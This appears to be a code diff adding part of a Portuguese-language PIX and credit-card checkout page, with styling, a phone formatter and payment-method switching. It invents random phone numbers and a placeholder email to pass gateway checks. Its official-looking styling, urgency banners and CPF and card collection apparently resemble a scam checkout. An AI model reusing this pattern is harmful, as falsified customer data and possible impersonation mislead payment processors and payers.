+      ta.value = code; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand('copy'); } catch (_) {}
+      ta.remove();
+      done();
+    }
+  }
+
+  function formatPhone(v) {
+    var d = String(v || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 2) return d;
+    if (d.length <= 7) return '(' + d.slice(0, 2) + ') ' + d.slice(2);
+    return '(' + d.slice(0, 2) + ') ' + d.slice(2, 7) + '-' + d.slice(7);
+  }
+
+  // Gera um celular brasileiro válido (DDD + 9 + 8 dígitos) para quando o cliente
+  // não informar o telefone — o gateway exige um número, mas o campo é opcional.
+  function randomPhone() {
+    var ddds = ['11','21','31','41','51','61','71','81','85','19','27','47','48','62','98'];
+    var ddd = ddds[Math.floor(Math.random() * ddds.length)];
+    var num = '9';
+    for (var i = 0; i < 8; i++) num += Math.floor(Math.random() * 10);
+    return ddd + num;
+  }
+
+  window.addEventListener('load', function () {
+    preencherDadosCliente();
+    retomarPagamento();
+
+    var phoneInput = document.getElementById('conf-phone');
+    if (phoneInput) {
+      if (!phoneInput.value && PHONE) phoneInput.value = formatPhone(PHONE);
+      phoneInput.addEventListener('input', function () {
+        this.value = formatPhone(this.value);
+      });
+    }
+  });
+  </script>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { min-height: 100%; width: 100%; }
+    body { font-family: 'Inter', sans-serif; background: #f0f2f5; }
+    .header {
+      background: #fff; border-bottom: 3px solid #1351B4; box-shadow: 0 2px 8px rgba(0,0,0,.08);
+      padding: 0 16px; height: 58px; display: flex; align-items: center; justify-content: space-between;
+      position: sticky; top: 0; z-index: 10;
+    }
+    .header img { height: 34px; }
+    .header-badge { background: #1351B4; color: #fff; border-radius: 50px; padding: 5px 13px; font-size: 13px; font-weight: 600; }
+    .container { max-width: 480px; margin: 0 auto; padding: 20px 16px 48px; }
+    .urgency { background: #FEF3C7; border: 1.5px solid #F59E0B; border-radius: 10px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; margin-bottom: 16px; font-size: 13px; font-weight: 600; color: #92400E; }
+    .urgency .icon { font-size: 20px; flex-shrink: 0; }
+    .info-card { background: #fff; border-radius: 14px; box-shadow: 0 2px 12px rgba(0,0,0,.08); padding: 20px; margin-bottom: 16px; }
+    .info-card .titulo { font-size: 13px; font-weight: 700; color: #888; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 14px; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; }
+    .info-row + .info-row { border-top: 1px solid #f0f0f0; }
+    .info-label { font-size: 13px; color: #666; }
+    .info-value { font-size: 13px; font-weight: 600; color: #1a1a1a; text-align: right; max-width: 60%; }
+    .info-value.destaque { color: #1351B4; }
+    .pix-card { background: #fff; border-radius: 14px; box-shadow: 0 2px 12px rgba(0,0,0,.08); padding: 24px 20px; text-align: center; }
+    .pix-card .valor-pix { font-size: 32px; font-weight: 800; color: #1351B4; margin-bottom: 4px; }
+    .pix-card .valor-desc { font-size: 13px; color: #888; margin-bottom: 20px; }
+    .loading-wrap { padding: 20px 0 10px; }
+    .spinner { width: 44px; height: 44px; border: 4px solid #e5e7eb; border-top-color: #1351B4; border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-txt { font-size: 14px; color: #666; }
+    .qr-wrap { display: none; }
+    .qr-container { background: #f9f9f9; border: 2px solid #1351B4; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: center; position: relative; }
+    #qr-img { max-width: 100%; width: 280px; height: 280px; display: block; margin: 0 auto; background: white; border-radius: 8px; }
+    .qr-loading { color: #666; font-size: 13px; padding: 60px 0; display: none; }
+    .qr-error { color: #DC2626; font-size: 13px; padding: 60px 20px; display: none; background: #FEE2E2; border-radius: 8px; }
+    .instrucao { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 16px; }
+    .instrucao ol { padding-left: 18px; }
+    .instrucao li { margin-bottom: 4px; }
+    .copy-wrap { background: #f0f4ff; border: 1.5px dashed #1351B4; border-radius: 10px; padding: 12px 14px; margin-bottom: 14px; }
+    .copy-label { font-size: 11px; font-weight: 700; color: #1351B4; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
+    .copy-code { font-size: 11px; font-family: monospace; color: #333; word-break: break-all; line-height: 1.5; margin-bottom: 10px; }
+    .btn-copy { width: 100%; padding: 11px; background: #1351B4; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; transition: background .15s; }
+    .btn-copy:hover { background: #0F4DA8; }
+    .btn-copy.copiado { background: #059669; }
+    .countdown-wrap { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; color: #666; margin-top: 14px; }
+    .countdown-num { font-weight: 700; color: #1351B4; }
+    .countdown-num.urgente { color: #DC2626; }
+    .aguardando { display: flex; align-items: center; justify-content: center; gap: 8px; background: #EFF6FF; border-radius: 8px; padding: 10px 14px; margin-top: 14px; font-size: 13px; font-weight: 600; color: #1351B4; }
+    .dot-blink { width: 8px; height: 8px; background: #1351B4; border-radius: 50%; animation: blink 1.2s infinite; }
+    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
+    .success-screen { display: none; text-align: center; padding: 20px 0 10px; }
+    .success-icon { width: 72px; height: 72px; background: #D1FAE5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 36px; }
+    .success-title { font-size: 20px; font-weight: 800; color: #059669; margin-bottom: 8px; }
+    .success-desc  { font-size: 14px; color: #555; line-height: 1.6; }
+    .erro-screen { display: none; text-align: center; padding: 10px 0; }
+    .erro-icon { font-size: 40px; margin-bottom: 12px; }
+    .erro-title { font-size: 16px; font-weight: 700; color: #DC2626; margin-bottom: 8px; }
+    .erro-desc { font-size: 13px; color: #666; margin-bottom: 16px; }
+    .btn-retry { background: #1351B4; color: #fff; border: none; border-radius: 8px; padding: 11px 24px; font-size: 14px; font-weight: 600; font-family: inherit; cursor: pointer; }
+    .btn-confirmar { width: 100%; padding: 14px; background: #1351B4; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: inherit; cursor: pointer; transition: background .15s; margin-top: 20px; }
+    .btn-confirmar:hover { background: #0F4DA8; }
+    .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #aaa; line-height: 1.7; }
+    .footer img { height: 22px; margin-bottom: 6px; opacity: .5; }
+    
+    /* === ESTILOS DO FORMULÁRIO DE CARTÃO === */
+    .toast-container {
+      position: fixed;
+      top: 70px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: 90%;
+      width: 400px;
+    }
+    .toast {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      animation: slideIn 0.3s ease-out;
+    }
+    .toast-error {
+      background-color: #D81A0D;
+      color: white;
+    }
+    .toast-success {
+      background-color: #22c55e;
+      color: white;
+    }
+    .toast-icon {
+      font-size: 18px;
+    }
+    .toast-message {
+      flex: 1;
+      font-size: 14px;
+    }
+    .toast-close {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+      opacity: 0.8;
+    }
+    .toast-close:hover {
+      opacity: 1;
+    }
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .payment-method-selector {
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #f0f0f0;
+    }
+    .payment-options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .payment-option-btn {
+      width: 100%;
+      padding: 16px;
+      background: #fff;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .payment-option-btn:hover {
+      border-color: #1351B4;
+      background: #f8f9ff;
+    }
+    .payment-option-btn.active {
+      border-color: #1351B4;
+      background: #f0f4ff;
+      box-shadow: 0 2px 8px rgba(19, 81, 180, 0.2);
+    }
+    .payment-option-content {
+      display: flex;
+      align-items: center;
+      text-align: left;
+    }
+    .payment-option-content svg {
+      color: #1351B4;
+    }
+    .payment-option-content strong {
+      display: block;
+      font-size: 15px;
+      color: #1a1a1a;
+      margin-bottom: 2px;
+    }
+    .payment-option-content small {
+      display: block;
+      font-size: 12px;
+      color: #666;
+    }
+    
+    .btn-voltar {
+      background: #f0f0f0;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 20px;
+      font-family: inherit;
+      transition: background 0.2s;
+    }
+    .btn-voltar:hover {
+      background: #e0e0e0;
+    }
+    
+    .card-form {
+      margin-top: 16px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 15px;
+      font-family: inherit;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .form-input:focus {
+      outline: none;
+      border-color: #1351B4;
+      box-shadow: 0 0 0 3px rgba(19, 81, 180, 0.1);
+    }
+    .form-input::placeholder {
+      color: #aaa;
+    }
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 16px;
+      padding: 12px;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 8px;
+      font-size: 12px;
+      color: #166534;
+    }
+    
+    .btn-loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .spinner-small {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+    }
+    
+    /* Popup 3DS styles estão no cartao.js inline */
+  </style>
+  
+  <!-- Script do formulário de cartão -->
+  <script src="js/cartao.js"></script>
+  
+  <script>
+document.addEventListener('DOMContentLoaded', function () {
+  const btnSelectPix = document.getElementById('btn-select-pix');
+  const btnSelectCard = document.getElementById('btn-select-card');
+  const btnConfirmar = document.getElementById('btn-confirmar');
+  const confirmacaoCard = document.getElementById('confirmacao-card');
+  const pixCard = document.getElementById('pix-card');
+  const cardFormContainer = document.getElementById('card-form-container');
+  const btnVoltarMetodo = document.getElementById('btn-voltar-metodo');
+
+  let metodoSelecionado = 'pix';
+
+  if (!btnConfirmar) {
+    console.error('Botão #btn-confirmar não encontrado.');
+    return;
+  }
+
+  // Selecionar PIX
+  if (btnSelectPix) {
+    btnSelectPix.addEventListener('click', function () {
+      metodoSelecionado = 'pix';
+      btnSelectPix.classList.add('active');
+
+      if (btnSelectCard) {
+        btnSelectCard.classList.remove('active');
+      }
+
+      btnConfirmar.textContent = 'Confirmar dados e gerar PIX';
+    });
+  }
+
+  // Selecionar cartão
+  if (btnSelectCard) {
+    btnSelectCard.addEventListener('click', function () {
+      metodoSelecionado = 'card';
+      btnSelectCard.classList.add('active');
+
+      if (btnSelectPix) {
+        btnSelectPix.classList.remove('active');
+      }
+
+      btnConfirmar.textContent = 'Pagar com Cartão de Crédito';
+    });
+  }
+
+  // Confirmar pagamento
+  btnConfirmar.addEventListener('click', function (event) {
+    event.preventDefault();
+
+    if (metodoSelecionado === 'card') {
+      if (confirmacaoCard) {
+        confirmacaoCard.style.display = 'none';
+      }
+
+      if (cardFormContainer) {
+        cardFormContainer.style.display = 'block';
+      }
+
+      const phoneInput = document.getElementById('conf-phone');
+      const phone = String(
+        phoneInput ? phoneInput.value : ''
+      ).replace(/\D/g, '');
+
+      const phoneToSave = phone.length >= 10
+        ? phone
+        : randomPhone();
+
+      localStorage.setItem('checkoutData', JSON.stringify({
+        price: PIX_AMOUNT_CENTS / 100,
+        isPackage: false,
+        diamonds: 0,
+        bonus: 0
+      }));
+
+      localStorage.setItem('customerData', JSON.stringify({
+        name: NOME,
+        email: EMAIL || 'cliente@email.com',
+        phone: phoneToSave,
+        cpf: CPF
+      }));
+
+      return;
+    }
+
+    // Pagamento PIX
+    const phoneInput = document.getElementById('conf-phone');
+    const phone = String(
+      phoneInput ? phoneInput.value : ''
+    ).replace(/\D/g, '');
+
+    PHONE = phone.length >= 10
+      ? phone
+      : randomPhone();
+
+    if (confirmacaoCard) {
+      confirmacaoCard.style.display = 'none';
+    }
+
+    if (pixCard) {
+      pixCard.style.display = 'block';
+    }
+
+    gerarPix();
+  });
+
+  // Voltar para seleção do método
+  if (btnVoltarMetodo) {
+    btnVoltarMetodo.addEventListener('click', function () {
+      if (cardFormContainer) {
+        cardFormContainer.style.display = 'none';
+      }
+
+      if (confirmacaoCard) {
+        confirmacaoCard.style.display = 'block';
+      }
+    });
+  }
+});
+</script>
+
+</body></html>
